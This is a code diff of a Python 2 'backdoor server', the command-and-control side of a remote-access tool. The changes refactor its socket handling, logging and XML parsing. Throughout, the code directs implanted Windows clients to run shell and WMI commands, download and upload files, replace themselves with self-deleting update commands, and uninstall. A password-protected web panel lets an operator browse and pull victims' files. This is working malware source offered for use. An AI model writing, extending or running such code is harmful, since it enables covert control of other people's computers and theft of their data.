@@ -4,32 +4,58 @@
 import sys, os, struct, re, errno, time, random, hashlib, traceback, tempfile
 import signal, subprocess
 import select, socket, urllib
-import json, xml.dom.minidom, cgi, mimetypes
+import json, cgi, mimetypes
 from threading import Thread
 from optparse import OptionParser, make_option
 
-try: import M2Crypto, M2Crypto.RSA, M2Crypto.X509
+try: 
+
+    # https://pypi.org/project/M2Crypto/
+    import M2Crypto, M2Crypto.RSA, M2Crypto.X509
+
 except ImportError:
 
-    print('ERROR: M2Crypto (https://pypi.python.org/pypi/M2Crypto) is not installed')
+    print('ERROR: M2Crypto is not installed')
     exit(-1)
 
-try: import Crypto, Crypto.Cipher.ARC4
+try: 
+
+    # https://pypi.org/project/pycrypto/
+    import Crypto, Crypto.Cipher.ARC4
+
 except ImportError:
 
-    print('ERROR: pycrypto (https://pypi.python.org/pypi/pycrypto) is not installed')
+    print('ERROR: pycrypto is not installed')
     exit(-1)
 
-try: import cherrypy, cherrypy.process.plugins
+try: 
+
+    # https://pypi.org/project/CherryPy/
+    import cherrypy, cherrypy.process.plugins
+
 except ImportError:
 
-    print('ERROR: CherryPy (https://pypi.python.org/pypi/CherryPy) is not installed')
+    print('ERROR: CherryPy is not installed')
     exit(-1)
 
-try: import redis
+try: 
+
+    # https://pypi.org/project/redis/
+    import redis
+
 except ImportError:
 
-    print('ERROR: redis-py (https://pypi.python.org/pypi/redis) is not installed')
+    print('ERROR: redis is not installed')
+    exit(-1)
+
+try:
+
+    # https://pypi.org/project/defusedxml/
+    import defusedxml.minidom
+
+except ImportError:
+
+    print('ERROR: defusedxml is not installed')
     exit(-1)
 
 from config import Conf
@@ -54,10 +80,11 @@ def log_write(data):
     global g_log_file
 
     data = '[%s]: %s' % (log_timestamp(), data)
+    data = data.encode('UTF-8')
 
     if g_log_file is not None:
 
-        g_log_file.write(data.encode('UTF-8'))
+        g_log_file.write(data)
         g_log_file.flush()
 
     sys.stdout.write(data)
@@ -67,7 +94,7 @@ def log_open(path):
 
     global g_log_file
 
-    log_write('Log file path is \"%s\"\n' % path)
+    log_write(u'Log file path is \"%s\"\n' % path)
 
     g_log_file = open(path, 'wb')
 
@@ -112,6 +139,39 @@ class ClientHelper(object):
         self.sock, self.client_id = sock, client_id
         self.redis = None
 
+    def send(self, data):
+
+        # send all of the data
+        return self.sendall(data)
+
+    def sendall(self, data):
+
+        assert self.sock is not None
+
+        return self.sock.sendall(data)            
+
+    def recv(self, size):
+
+        assert self.sock is not None
+
+        return self.sock.recv(size)
+
+    def recvall(self, size):
+
+        ret = ''
+
+        assert self.sock is not None
+
+        while len(ret) < size:
+            
+            # receive specified amount of data
+            data = self.sock.recv(size - len(ret))
+            assert len(data) > 0
+
+            ret += data
+
+        return ret
+
     def create_folders(self):
 
         assert self.client_id is not None
@@ -144,13 +204,13 @@ class ClientHelper(object):
         assert self.sock is not None
 
         # query client ID
-        self.sock.sendall('id\n')
+        self.sendall('id\n')
 
         ret = ''
 
         while len(ret) == 0 or ret[-1] != '\n':
             
-            data = self.sock.recv(BUFF_SIZE)
+            data = self.recv(BUFF_SIZE)
             assert len(data) > 0
 
             ret += data
@@ -168,13 +228,13 @@ class ClientHelper(object):
         assert self.sock is not None
 
         # query basic client information
-        self.sock.sendall('info\n')
+        self.sendall('info\n')
 
         ret = ''
 
         while len(ret) == 0 or ret[-1] != '\n':
             
-            data = self.sock.recv(BUFF_SIZE)
+            data = self.recv(BUFF_SIZE)
             assert len(data) > 0
 
             ret += data
@@ -188,19 +248,19 @@ class ClientHelper(object):
 
         assert self.sock is not None
 
-        self.sock.sendall('ping\n')
+        self.sendall('ping\n')
 
     def exit(self):
 
         assert self.sock is not None
 
-        self.sock.sendall('exit\n')
+        self.sendall('exit\n')
 
     def uninstall(self):
 
         assert self.sock is not None
 
-        self.sock.sendall('uninst\n')
+        self.sendall('uninst\n')
 
     def _is_end_of_output(self, data):    
 
@@ -221,14 +281,14 @@ class ClientHelper(object):
         assert self.sock is not None
 
         # send command string
-        self.sock.sendall(cmd.encode('UTF-8') + '\n')
+        self.sendall(cmd.encode('UTF-8') + '\n')
 
         ret, code = '', None
 
         while True:
 
             # receive the command output
-            data = self.sock.recv(BUFF_SIZE)
+            data = self.recv(BUFF_SIZE)
             assert len(data) > 0            
 
             m = self._is_end_of_output(data)
@@ -237,12 +297,20 @@ class ClientHelper(object):
                 # end of the command output
                 data, code = m
 
-            ret += data
-            if stream is not None: stream.write(data.decode('UTF-8'))
+            ret += data            
 
-            if m is not None: break
+            if m is not None: 
 
-        return ret.decode('UTF-8'), code
+                break
+
+        ret = ret.decode('UTF-8')
+
+        if stream is not None: 
+
+            # write data to the stream at the end of the output
+            stream.write(ret)
+
+        return ret, code
 
     def execute(self, cmd, stream = None, log = True):
 
@@ -254,7 +322,10 @@ class ClientHelper(object):
 
             if log:
 
-                fd.write('[%s]: COMMAND: %s\n' % (log_timestamp(), cmd.encode('UTF-8')))
+                message = u'[%s]: COMMAND: %s\n' % (log_timestamp(), cmd)
+
+                # write log file message
+                fd.write(message.encode('UTF-8'))
 
             # execute command on the client
             data, code = self._execute('exec ' + cmd.strip(), stream = stream)
@@ -275,8 +346,8 @@ class ClientHelper(object):
 
         if len(data) > 0 and data[-1] == '\\':
 
-            # remove ending path separator
-            data = data[:-1]
+            # remove ending slash
+            data = data[: -1]
 
         assert code == 0
         assert len(data) > 0
@@ -292,7 +363,7 @@ class ClientHelper(object):
         if isinstance(props, basestring): query += props
         elif isinstance(props, list): query += ','.join(props)
 
-        log_write('execute_wmi(%s): %s\n' % (self.client_id, query))
+        log_write(u'execute_wmi(%s): %s\n' % (self.client_id, query))
 
         # execute WMI query with XML output
         data, code = self.execute('wmic %s /format:rawxml' % query, log = False)
@@ -300,7 +371,7 @@ class ClientHelper(object):
 
         if code != 0:
 
-            log_write('execute_wmi(%s) ERROR: wmic returned 0x%x\n' % (self.client_id, code))
+            log_write(u'execute_wmi(%s) ERROR: wmic returned 0x%x\n' % (self.client_id, code))
             return None        
 
         try:
@@ -308,7 +379,7 @@ class ClientHelper(object):
             assert len(data) > 0
 
             # parse query results
-            doc = xml.dom.minidom.parseString(data)
+            doc = defusedxml.minidom.parseString(data)
             root = doc.documentElement
             res = root.getElementsByTagName('RESULTS')[0]
 
@@ -316,7 +387,7 @@ class ClientHelper(object):
 
                 # check for an error
                 err = res.getElementsByTagName('ERROR')[0]
-                log_write('execute_wmi(%s) ERROR: Bad result\n' % self.client_id)
+                log_write(u'execute_wmi(%s) ERROR: Bad result\n' % self.client_id)
                 return None
 
             except IndexError: pass
@@ -344,7 +415,7 @@ class ClientHelper(object):
 
         except Exception, why:
 
-            log_write('execute_wmi(%s) ERROR: %s\n' % (self.client_id, str(why)))
+            log_write(u'execute_wmi(%s) ERROR: %s\n' % (self.client_id, str(why)))
             return None
 
     def os_version(self):
@@ -403,7 +474,7 @@ class ClientHelper(object):
 
         else:
 
-            log_write('update(%s) ERROR: Unknown file type' % self.client_id)
+            log_write(u'update(%s) ERROR: Unknown file type' % self.client_id)
             return False
 
         # upload file to the client
@@ -414,14 +485,14 @@ class ClientHelper(object):
         remote_cmd = 'cmd.exe /C "%s & ping 127.0.0.1 -n 3 > NUL & del %s"' % \
                      (cmd.encode('UTF-8'), remote_path.encode('UTF-8'))
 
-        log_write('update(%s): %s\n' % (self.client_id, remote_cmd))
+        log_write(u'update(%s): %s\n' % (self.client_id, remote_cmd))
 
         # execute update command on the client
-        self.sock.sendall('upd ' + remote_cmd + '\n')
+        self.sendall('upd ' + remote_cmd + '\n')
 
         try:
 
-            assert len(self.sock.recv(1)) > 0
+            assert len(self.recvall(1)) > 0
             return False
 
         except:
@@ -432,14 +503,14 @@ class ClientHelper(object):
 
         assert self.client_id is not None
 
-        log_write('file_list(%s): %s\n' % (self.client_id, path.encode('UTF-8')))
+        log_write(u'file_list(%s): %s\n' % (self.client_id, path))
 
         # list of the files in specified folder
         data, code = self._execute('flist ' + path.strip())
         if code != 0: 
 
             # command failed
-            log_write('ERROR: file_list() failed with code 0x%.8x\n' % code)
+            log_write(u'ERROR: file_list() failed with code 0x%.8x\n' % code)
             return None
 
         ret = []
@@ -453,7 +524,7 @@ class ClientHelper(object):
             assert len(line) > 1
 
             # parse single file/directory information
-            ret.append(( None if line[0] == 'D' else int(line[0], 16), ' '.join(line[1:]) ))
+            ret.append(( None if line[0] == 'D' else int(line[0], 16), ' '.join(line[1 :]) ))
 
         return ret
 
@@ -465,43 +536,43 @@ class ClientHelper(object):
         assert self.sock is not None
         assert self.client_id is not None
 
-        log_write('file_get(%s): Downloading file \"%s\" into the \"%s\"\n' % \
+        log_write(u'file_get(%s): Downloading file \"%s\" into the \"%s\"\n' % \
                   (self.client_id, path, local_path))
 
         # send download file command
-        self.sock.sendall('fget ' + path.encode('UTF-8') + '\n')
+        self.sendall('fget ' + path.encode('UTF-8') + '\n')
 
-        with open(local_path, 'wb') as fd:
+        with open(local_path.encode('UTF-8'), 'wb') as fd:            
 
             # receive file size
-            size = self.sock.recv(8)
+            size = self.recvall(8)
             assert len(size) == 8
 
-            size = struct.unpack('Q', size)[0]            
+            size = struct.unpack('Q', size)[0]
             if size != 0xffffffffffffffff:
 
-                log_write('file_get(%s): File size is %d\n' % (self.client_id, size))
+                recvd = 0
 
-                readed = 0
+                log_write(u'file_get(%s): File size is %d\n' % (self.client_id, size))
 
-                while readed < size:
+                while recvd < size:
                     
                     # receive file contents
-                    data = self.sock.recv(min(BUFF_SIZE, size - readed))
+                    data = self.recv(min(BUFF_SIZE, size - recvd))
                     if len(data) == 0:
 
                         raise(Exception('Connection error'))
 
                     # write the data into the local file
                     fd.write(data)
-                    readed += len(data)
+                    recvd += len(data)
 
                 ret = True
 
             else:
 
                 # command failed
-                log_write('ERROR: file_get() failed\n')
+                log_write(u'ERROR: file_get() failed\n')
 
         if not ret and os.path.isfile(local_path):
 
@@ -519,29 +590,29 @@ class ClientHelper(object):
         assert self.sock is not None
         assert self.client_id is not None
 
-        log_write('file_put(%s): Uploading file \"%s\" into the \"%s\"\n' % \
+        log_write(u'file_put(%s): Uploading file \"%s\" into the \"%s\"\n' % \
                   (self.client_id, local_path, path))
 
         # get local file size
         size = os.path.getsize(local_path)
 
-        log_write('file_put(%s): File size is %d\n' % (self.client_id, size))
+        log_write(u'file_put(%s): File size is %d\n' % (self.client_id, size))
 
         # send upload file command 
-        self.sock.sendall('fput ' + path.encode('UTF-8') + '\n')
+        self.sendall('fput ' + path.encode('UTF-8') + '\n')
 
-        status = self.sock.recv(1)
+        status = self.recvall(1)
         assert len(status) == 1
 
         status = struct.unpack('B', status)[0]
         if status == 0:
 
             # command failed
-            log_write('ERROR: file_put() failed\n')
+            log_write(u'ERROR: file_put() failed\n')
             return False
 
         # send file size
-        self.sock.sendall(struct.pack('Q', size))
+        self.sendall(struct.pack('Q', size))
 
         with open(local_path, 'rb') as fd:
 
@@ -554,7 +625,7 @@ class ClientHelper(object):
                 assert len(data) > 0
                 
                 # send data to the client
-                self.sock.sendall(data)
+                self.sendall(data)
                 sent += len(data)
 
             ret = True
@@ -563,58 +634,15 @@ class ClientHelper(object):
 
     def mapper_connect(self):
 
-        class MapperStream(object):
-
-            def __init__(self, sock):
-
-                self.sock = sock
-
-            def sendall(self, data):
-
-                return self.sock.sendall(struct.pack('I', len(data)) + data)
-
-            def send(self, data):
-
-                return self.sendall(data)
-
-            def _recv(self, size):
-
-                ret = ''
-
-                while len(ret) < size:
-                    
-                    data = self.sock.recv(size - len(ret))
-                    assert len(data) > 0
-
-                    ret += data
-
-                return ret
-
-            def recv(self, size):                
-
-                # receive the data size
-                size = self._recv(4)
-                data, size = '', struct.unpack('I', size)[0]
-
-                while len(data) < size:
-
-                    # receive specified amount of data
-                    temp = self.sock.recv(size - len(data))
-                    assert len(temp) > 0
-
-                    data += temp
-
-                return data
-
         # query client informaion
         client = self.client_get()
-        if client is None: return False
+        if client is None: 
+
+            return False
 
         # connect to the client process
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect(( Conf.MAPPER_HOST, client.map_port ))
-
-        self.sock = MapperStream(sock)
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.sock.connect(( Conf.MAPPER_HOST, client.map_port ))
 
         return True
 
@@ -631,7 +659,7 @@ class ClientHelper(object):
 
         self.redis_connect()
 
-        log_write('client_add(%s)\n' % self.client_id)
+        log_write(u'client_add(%s)\n' % self.client_id)
 
         # add client info to the database
         self.redis.set(self.client_id, json.dumps(props))
@@ -655,7 +683,7 @@ class ClientHelper(object):
 
         self.redis_connect()
 
-        log_write('client_del(%s)\n' % self.client_id)
+        log_write(u'client_del(%s)\n' % self.client_id)
 
         # remove client info from the database
         self.redis.delete(self.client_id)
@@ -827,13 +855,13 @@ class ClientMapper(Thread):
 
                 continue
 
-            if Conf.VERBOSE: log_write('MAPPER: Client %s:%d connected\n' % client_addr)
+            if Conf.VERBOSE: log_write(u'MAPPER: Client %s:%d connected\n' % client_addr)
 
             while self.running:
 
                 if self.server.client_sock is None:
 
-                    if Conf.VERBOSE: log_write('MAPPER: Client %s:%d disconnected\n' % client_addr)
+                    if Conf.VERBOSE: log_write(u'MAPPER: Client %s:%d disconnected\n' % client_addr)
                     break
 
                 time.sleep(1)
@@ -883,6 +911,7 @@ class ClientDispatcher(object):
 
         while len(ret) < size:
             
+            # receive specified amount of data
             data = self.request.recv(size - len(ret))
             assert len(data) > 0
 
@@ -896,7 +925,8 @@ class ClientDispatcher(object):
 
         while ret < len(data):
             
-            size = self.request.send(data[ret:])
+            # send all of the data
+            size = self.request.send(data[ret :])
             assert size > 0
 
             ret += size
@@ -974,36 +1004,28 @@ class ClientDispatcher(object):
             self.client_sock.close()
             self.client_sock = None
 
-        def _client_sock_recv(size):
-
-            ret = ''
-
-            while len(ret) < size:
-                
-                data = self.client_sock.recv(size - len(ret))
-                assert len(data) > 0
-
-                ret += data
-
-            return ret
-
         addr = ( Conf.MAPPER_HOST, random.randrange(Conf.MAPPER_PORT_MIN, Conf.MAPPER_PORT_MAX) )         
         mapper, helper = None, None
 
         try:
 
-            stream = self._do_auth() 
+            # perform authentication
+            stream = self._do_auth()
+
+            # create client instance 
             helper = ClientHelper(sock = stream)
             helper.client_id = helper.get_id()
 
+            # create folders for client files
             helper.create_folders()
 
-            log_write('SERVER: Client %s:%d connected (ID = %s, PID = %d, port = %d)\n' % \
+            log_write(u'SERVER: Client %s:%d connected (ID = %s, PID = %d, port = %d)\n' % \
                 (self.client_address[0], self.client_address[1], helper.client_id, os.getpid(), addr[1]))
 
             helper.client_add(addr = self.client_address, map_port = addr[1], map_pid = os.getpid(), 
                               os_version = helper.os_version(), hardware = helper.hardware_info(), info = helper.get_info())
 
+            # start mapper to receive connections from the main process
             mapper = ClientMapper(addr, self)
             mapper.start()
 
@@ -1019,17 +1041,19 @@ class ClientDispatcher(object):
 
                 if self.request in read:
 
+                    # receive data from the client
                     data = stream.recv(BUFF_SIZE)
                     if len(data) == 0: break
 
                     # check for ping from the client
                     if re.search('^\{\{\{\$[0123456789abcdef]{8}\}\}\}$', data) is not None:
 
-                        if Conf.VERBOSE: log_write('SERVER: Ping from client %s:%d\n' % self.client_address)
+                        if Conf.VERBOSE: log_write(u'SERVER: Ping from client %s:%d\n' % self.client_address)
 
                     elif self.client_sock is not None: 
 
-                        self.client_sock.sendall(struct.pack('I', len(data)) + data)
+                        # send data to the main process
+                        self.client_sock.sendall(data)
 
                     last_request = time.time()
 
@@ -1039,15 +1063,9 @@ class ClientDispatcher(object):
 
                     try:                         
 
-                        size = _client_sock_recv(4)
-                        data, size = '', struct.unpack('I', size)[0]
-
-                        while len(data) < size:
-
-                            temp = self.client_sock.recv(size - len(data))
-                            assert len(temp) > 0
-
-                            data += temp
+                        # receive data from the main process
+                        data = self.client_sock.recv(BUFF_SIZE)
+                        assert len(data) > 0                        
 
                     except: 
 
@@ -1059,21 +1077,22 @@ class ClientDispatcher(object):
 
                     else:
 
+                        # send data to the client
                         stream.send(data) 
 
                 if time.time() - last_request >= Conf.CLIENT_TIMEOUT:
 
-                    log_write('SERVER: Client %s:%d timeout occured\n' % self.client_address)
+                    log_write(u'SERVER: Client %s:%d timeout occured\n' % self.client_address)
                     break
 
         except Exception, why:
 
-            log_write('ERROR: Exception in handle():\n')
-            log_write('-----------------------------------------\n')
+            log_write(u'ERROR: Exception in handle():\n')
+            log_write(u'-----------------------------------------\n')
             log_write(traceback.format_exc())
-            log_write('-----------------------------------------\n')
+            log_write(u'-----------------------------------------\n')
 
-        log_write('SERVER: Client %s:%d disconnected\n' % self.client_address)
+        log_write(u'SERVER: Client %s:%d disconnected\n' % self.client_address)
 
         if self.client_sock is not None:
 
@@ -1102,7 +1121,7 @@ class Daemon:
         sys.stdout.flush()
         sys.stderr.flush()     
 
-        log_write('Going to the background...\n')
+        log_write(u'Going to the background...\n')
 
         try:
           
@@ -1161,7 +1180,7 @@ class Server(object):
 
         self.addr = ( addr, port )        
 
-        log_write('Starting backdoor server at address %s:%d\n' % self.addr)        
+        log_write(u'Starting backdoor server at address %s:%d\n' % self.addr)        
 
         # bind socket for the data transfer connection
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -1206,6 +1225,7 @@ class ServerHttpAdmin(object):
 <link rel="shortcut icon" href="''' + Conf.HTTP_PATH + '''/static/favicon.png" />
 <link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/jquery.terminal.css" />
 <link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/main.css" />
+<link rel="stylesheet" type="text/css" href="''' + Conf.HTTP_PATH + '''/static/fonts/ibm-plex.css" />
 <script src="''' + Conf.HTTP_PATH + '''/static/jquery-1.9.1.min.js"></script>
 <script src="''' + Conf.HTTP_PATH + '''/static/jquery.terminal-0.7.6.min.js"></script>
 <script src="''' + Conf.HTTP_PATH + '''/static/main.js"></script>
@@ -1407,7 +1427,7 @@ class ServerHttpAdmin(object):
 
         if len(path) > 0:
 
-            data += '<form action="%s/fput?id=%s&p=%s" method="POST" enctype="multipart/form-data">  <b>Upload</b>: <input type="submit" /><input type="file" name="file" /></form>' % \
+            data += '<form action="%s/fput?id=%s&p=%s" method="POST" enctype="multipart/form-data">  <b>Upload</b>: <input type="submit" value="Submit" /><input type="file" name="file" /></form>' % \
                      (Conf.HTTP_PATH, client_id, path)
 
         data += '''</div>
@@ -1422,13 +1442,13 @@ class ServerHttpAdmin(object):
             # make current path for bavigation bar
             nav.append(self.to_link('%s/flist?id=%s&p=%s' % \
                                      (Conf.HTTP_PATH, client_id, 
-                                      to_quote('\\'.join(items[:i + 1]))), items[i]))
+                                      to_quote('\\'.join(items[: i + 1]))), items[i]))
 
         if len(path) > 0:
 
             temp += '%15s [%s]\n' % ('', self.to_link('%s/flist?id=%s&p=%s' % \
                                      (Conf.HTTP_PATH, client_id, 
-                                      to_quote('\\'.join(items[:-1]))), '..'))
+                                      to_quote('\\'.join(items[: -1]))), '..'))
 
         for size, name in files:
 
@@ -1443,9 +1463,9 @@ class ServerHttpAdmin(object):
             if size is not None:
 
                 # list files
-                temp += '%15s %s\n' % ('{:0,.2f}'.format(size).split('.')[0], \
-                                       self.to_link('%s/fget?id=%s&p=%s' % \
-                                       (Conf.HTTP_PATH, client_id, to_path(name)), name))
+                temp += '%15s  %s\n' % ('{:0,.2f}'.format(size).split('.')[0], \
+                                        self.to_link('%s/fget?id=%s&p=%s' % \
+                                        (Conf.HTTP_PATH, client_id, to_path(name)), name))
 
         return self.to_html(title, (data % (client_id, client.addr[0], '\\'.join(nav))) + temp)
 
@@ -1453,17 +1473,6 @@ class ServerHttpAdmin(object):
     def fget(self, cancel = False, **data): 
 
         title = 'Download File'
-
-        def path_escape(path):
-
-            ret, path = '', path.encode('UTF-16')[2:]
-
-            for i in range(len(path) / 2):
-
-                c, e = path[i * 2 : (i + 1) * 2]
-                if e == '\0': ret += c
-
-            return ret
 
         assert data.has_key('id')
         assert data.has_key('p')
@@ -1477,8 +1486,9 @@ class ServerHttpAdmin(object):
 
             return self.to_html(title, '<font color="red">ERROR: No such client</font>')
 
+        # generate local file name
         fname = '%s_%s' % (hashlib.md5(path.encode('UTF-8')).hexdigest(), 
-                           path_escape(path.replace('\\', '/').split('/')[-1]))
+                           path.replace('\\', '/').split('/')[-1])
 
         fpath = os.path.join(Conf.DOWNLOADS_DIR_PATH, client_id, fname)
 
@@ -1486,7 +1496,8 @@ class ServerHttpAdmin(object):
         if helper.file_get(path, fpath):
 
             # server downloaded file
-            raise cherrypy.HTTPRedirect('%s/downloads/%s/%s' % (Conf.HTTP_PATH, client_id, fname))
+            raise cherrypy.HTTPRedirect('%s/downloads/%s/%s' % (Conf.HTTP_PATH, client_id, 
+                                                                cgi.escape(fname)))
 
         return self.to_html(title, '<font color="red">ERROR: Can\'t download file from the client</font>')
 
@@ -1534,7 +1545,7 @@ class ServerHttpAdmin(object):
         if ret:
 
             raise cherrypy.HTTPRedirect('%s/flist?id=%s&p=%s' % (Conf.HTTP_PATH, client_id, \
-                                                                urllib.quote_plus(path.encode('UTF-8'))))
+                                                                cgi.escape(path)))
 
         return self.to_html(title, '<font color="red">ERROR: Can\'t upload file to the client</font>')
 
@@ -1618,7 +1629,8 @@ class ServerHttp():
 
                 if branch[-1] in [ '\\', '/' ]: 
 
-                    branch = branch[:-1]
+                    # remove ending slash
+                    branch = branch[: -1]
 
                 path = os.path.join(path, branch)
                 path_full = os.path.join(path_full, branch)            
@@ -1639,7 +1651,7 @@ class ServerHttp():
                 # set the Last-Modified response header
                 cptools.validate_since()
                 
-                cherrypy.response.headers['Content-Type'] = 'text/html'
+                cherrypy.response.headers['Content-Type'] = 'text/html; charset=utf-8'
                 cherrypy.response.body = lister(path, path_full)
                 
                 cherrypy.request.is_index = True
@@ -1656,7 +1668,8 @@ class ServerHttp():
 '''
             if path[0] in [ '\\', '/' ]:
 
-                path = path[1:]
+                # remove starting slash
+                path = path[1 :]
 
             temp, nav, items = '', [], path.replace('\\', '/').split('/')
             to_link = lambda p, t: '<a href="%s/%s">%s</a>' % (Conf.HTTP_PATH, p, t)
@@ -1664,11 +1677,11 @@ class ServerHttp():
             for i in range(len(items)):
 
                 # make current path for bavigation bar
-                nav.append(to_link('\\'.join(items[:i + 1]), items[i]))
+                nav.append(to_link('\\'.join(items[: i + 1]), items[i]))
 
             if len(nav) > 1:
 
-                temp += '%15s [%s]\n' % ('', to_link('/'.join(items[:-1]), '..'))
+                temp += '%15s [%s]\n' % ('', to_link('/'.join(items[: -1]), '..'))
 
             for fname in os.listdir(path_full):
 
@@ -1731,6 +1744,10 @@ class ServerHttp():
             }
         })     
 
+        # content types to serve static files
+        content_types = { 'log': 'text/plain; charset=utf-8',
+                          'txt': 'text/plain; charset=utf-8' }
+
         cherrypy.tree.mount(ServerHttpAdmin({}), Conf.HTTP_PATH + '/',
         {
             '/':
@@ -1741,17 +1758,6 @@ class ServerHttp():
                 'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                 'error_page.401': _error_page,
                 'response.headers.server': Conf.HTTP_SERVER_NAME
-            },
-
-            '/logs':
-            {
-                'tools.auth_digest.on': True,
-                'tools.auth_digest.realm': Conf.HTTP_RELAM,
-                'tools.auth_digest.get_ha1': get_ha1,
-                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
-                'tools.staticdir.on': True,
-                'tools.staticdir.dir': Conf.LOG_DIR_PATH,
-                'tools.staticdir.lister': _staticdir_list               
             },
 
             '/static':
@@ -1765,6 +1771,18 @@ class ServerHttp():
                 'tools.staticdir.lister': _staticdir_list
             },
 
+            '/logs':
+            {
+                'tools.auth_digest.on': True,
+                'tools.auth_digest.realm': Conf.HTTP_RELAM,
+                'tools.auth_digest.get_ha1': get_ha1,
+                'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
+                'tools.staticdir.on': True,
+                'tools.staticdir.dir': Conf.LOG_DIR_PATH,
+                'tools.staticdir.lister': _staticdir_list,
+                'tools.staticdir.content_types': content_types
+            },            
+
             '/downloads':
             {
                 'tools.auth_digest.on': True,
@@ -1773,7 +1791,8 @@ class ServerHttp():
                 'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                 'tools.staticdir.on': True,
                 'tools.staticdir.dir': Conf.DOWNLOADS_DIR_PATH,
-                'tools.staticdir.lister': _staticdir_list
+                'tools.staticdir.lister': _staticdir_list,
+                'tools.staticdir.content_types': content_types
             },
 
             '/server.log':
@@ -1783,7 +1802,8 @@ class ServerHttp():
                 'tools.auth_digest.get_ha1': get_ha1,
                 'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                 'tools.staticfile.on': True,
-                'tools.staticfile.filename': Conf.LOG_FILE_PATH
+                'tools.staticfile.filename': Conf.LOG_PATH_SERVER,
+                'tools.staticfile.content_types': content_types
             },
 
             '/access.log':
@@ -1793,20 +1813,21 @@ class ServerHttp():
                 'tools.auth_digest.get_ha1': get_ha1,
                 'tools.auth_digest.key': Conf.HTTP_DIGEST_KEY,
                 'tools.staticfile.on': True,
-                'tools.staticfile.filename': Conf.LOG_FILE_PATH_HTTP
+                'tools.staticfile.filename': Conf.LOG_PATH_ACCESS,
+                'tools.staticfile.content_types': content_types
             }
         })        
 
-        if os.path.isfile(Conf.LOG_FILE_PATH_HTTP):
+        if os.path.isfile(Conf.LOG_PATH_ACCESS):
 
             # delete old log file
-            try: os.unlink(Conf.LOG_FILE_PATH_HTTP)
+            try: os.unlink(Conf.LOG_PATH_ACCESS)
             except: pass
 
         cherrypy.config.update(
         {
-            'log.access_file': Conf.LOG_FILE_PATH_HTTP,
-            'log.error_file': Conf.LOG_FILE_PATH_HTTP
+            'log.access_file': Conf.LOG_PATH_ACCESS,
+            'log.error_file': Conf.LOG_PATH_ACCESS
         })
 
         self.watcher = ServerHttpWatcher(cherrypy.engine)
@@ -1866,8 +1887,8 @@ def main():
     parser = OptionParser(option_list = option_list)
     options, _ = parser.parse_args()
 
-    options.addr = Conf.LISTEN_HOST if options.addr is None else options.addr
-    options.port = Conf.LISTEN_PORT if options.port is None else int(options.port)
+    options.addr = Conf.CLIENT_HOST if options.addr is None else options.addr
+    options.port = Conf.CLIENT_PORT if options.port is None else int(options.port)
 
     if options.list:
 
@@ -2031,7 +2052,7 @@ def main():
         return 0
 
     # start log file
-    log_open(Conf.LOG_FILE_PATH if options.log_path is None else options.log_path)            
+    log_open(Conf.LOG_PATH_SERVER if options.log_path is None else options.log_path)            
 
     server = Server(options.addr, options.port)
 
@@ -2050,14 +2071,14 @@ def main():
 
         except Exception, why:
 
-            log_write('HTTP server error: %s\n' % str(why))
+            log_write(u'HTTP server error: %s\n' % str(why))
         
         exit(0)
 
     pid = os.getpid()
     pgid = os.getpgid(pid)
 
-    log_write('%s PID = %d, PGID = %d\n' % (os.path.basename(sys.argv[0]), pid, pgid))
+    log_write(u'%s PID = %d, PGID = %d\n' % (os.path.basename(sys.argv[0]), pid, pgid))
 
     with open(Conf.PGID_FILE_PATH, 'w') as fd: 
 
